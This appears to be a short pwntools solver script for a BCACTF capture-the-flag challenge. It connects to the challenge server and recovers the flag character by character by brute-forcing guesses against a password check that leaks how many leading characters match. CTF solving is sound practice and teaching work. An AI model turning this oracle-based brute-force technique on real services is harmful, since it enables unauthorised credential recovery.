import string
from pwn import *

r = remote('challenges.ctfd.io', 30133)

flag = 'bcactf{'
while len(flag) < 37:
	for ch in string.ascii_letters + string.digits + string.punctuation:
		r.sendlineafter('Enter the password.\n', flag + ch)
		if r.recvline().count('1') == len(flag) + 1:
			flag = flag + ch
			print(flag)
			break
flag += '}'

print(flag)
